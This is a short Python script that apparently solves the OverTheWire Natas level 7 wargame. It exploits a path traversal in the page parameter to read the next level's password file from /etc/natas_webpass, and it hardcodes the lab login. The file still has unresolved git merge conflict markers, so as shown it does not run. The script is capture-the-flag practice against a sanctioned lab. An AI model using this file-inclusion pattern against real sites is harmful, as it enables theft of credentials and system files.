import requests
#http://docs.python-requests.org/en/master/
<<<<<<< HEAD
#payload={'page':'../../../../../etc/natas_webpass/natas8'}
payload={'page':'about'}

url="http://natas7.natas.labs.overthewire.org/index.php"


r=requests.get(url, data=payload, auth=('natas7','7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'))
=======
#payload={'page':'home'}
url="http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
r=requests.get(url, auth=('natas7','7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'))
>>>>>>> 5e7e3cc1330921bc7ae888bda34dbe0c380addd6

print r.text
